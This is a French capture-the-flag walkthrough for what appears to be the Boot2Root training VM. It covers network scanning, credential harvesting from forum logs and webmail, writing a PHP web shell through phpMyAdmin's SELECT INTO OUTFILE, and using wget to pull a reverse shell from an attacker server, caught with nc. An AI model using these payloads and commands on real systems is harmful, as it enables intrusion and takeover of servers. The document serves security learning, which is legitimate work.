Une fois l'iso lancé, on cherche son IP sur le réseau:
`nmap -sP 192.1.1.0/24`

On scan ensuite les dossiers utilisés par la plupart des appli et serveurs web:
`nmap -sV --script=http-enum <IP>`

On trouve les chemins suivants:
 > /forum/: Forum
/phpmyadmin/: phpMyAdmin
/webmail/src/login.php: squirrelmail version 1.4.22
/webmail/images/sm_logo.png: SquirrelMail

On se rend sur le forum, dans lequel on trouve un topic 'Probleme login ?' posté par lmezard.
Il contient des logs de connexions.
On remarque que le log précédent la connexion réussie de lmezard contient un username ressemblant a un mot de passe : !q\]Ej?*5K5cy*AJ
On utiliser ces credentials pour se connecter au forum.
On accede au profil perso de lmezard dans lequel apparait son adresse mail :
> laurie@borntosec.net

On se rend sur le webmail, et on utilise le mail de lmezard avec son MDP du forum.
Dans la boite, un mail dont l'objet est "DB Access" contient les credentials de root pour la DB :
> root/Fg-'kKXBj87E:aJ$

On se rend sur phpMyAdmin, et on utilise les credentials trouvés dans le mail.
En cliquant sur l'onglet SQL on peut effectuer une injection SQL sur le serveur.
Pour cela on a besoin de lancer la requete suivante:
`SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/path/to/writable/directory/backdoor.php"`

On a donc besoin de trouver un dossier sur le serveur avec droits d'écriture. Sinon la requête fail.

On utilise la commande dirb pour scanner les dossiers du serveur:
`dirb https://<IP>`

On trouve toute une liste de dossiers, listables ou non, on les teste les listables, on arrive a écrire dans 
> /forum/templates_c/

Le serveur apache utilise le chemin classique "/var/www" pour stocker ses sites.
On lance donc la requête:
`SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/forum/templates_c/backdoor.php"`

Le fichier backdoor.php va donc exéctuer sur le serveur toute commande passée en argument dans l'URL, par exemple: 
`https://<IP>/forum/templates_c/backdoor.php?cmd=ls`
On obtient bien la liste des fichiers présents dans le dossier.

Pour faciliter la navigation dans le filesystem, on peut uploader un reverse shell sur le serveur pour s'y connecter en remote.
On récupère un reverse-shell sur le web qu'on configure pour fonctionner avec nos VM.
Pour uploader ce shell sur le serveur, on le place sur un serveur perso et on utilise notre backdoor.
Sur le serveur perso, on place php-reverse-shell à la racine du site.
Sur un browser on lance:
`https://<IP>/forum/templates_c/backdoor.php?cmd=wget http://<IPserveur>/php-reverse-shell -O php-reverse-shell.php`
Le shell est désormais sur le serveur.
On ouvre une connexion TCP sur l'hôte :
 `nc -v -n -l -p 1234`
Puis on lance le shell sur le serveur :
`https://<IP>/forum/templates_c/php-reverse-shell.php`
La connexion s'effectue sur l'hôte, on a accès à un terminal sous le user www-data.
